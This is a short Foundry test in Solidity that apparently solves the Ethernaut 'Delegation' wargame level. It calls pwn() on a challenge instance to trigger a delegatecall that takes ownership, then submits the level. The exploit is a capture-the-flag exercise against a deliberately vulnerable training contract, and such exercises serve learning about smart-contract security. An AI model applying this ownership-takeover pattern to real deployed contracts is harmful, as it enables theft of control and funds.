// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract DelegationTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xF695A9661A3b909ffb15F97556bAb286b19520E7);
  }

  function testExploit() public {
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("pwn()"));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
